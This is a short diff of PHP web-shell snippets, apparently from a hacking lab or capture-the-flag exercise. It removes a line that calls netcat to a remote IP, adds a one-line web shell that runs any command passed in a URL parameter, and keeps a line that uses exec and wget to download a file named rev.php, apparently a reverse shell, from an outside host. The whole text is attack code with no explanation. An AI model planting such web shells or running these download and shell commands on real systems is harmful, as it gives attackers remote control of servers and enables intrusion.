@@ -1,4 +1,4 @@
-<? passthru(nc 10.10.14.156 1234) ?> 
+<? passthru($_GET["cmd"]); ?> 
 
 
 <?php exec("wget http://10.10.14.56:8888/rev.php"); ?>
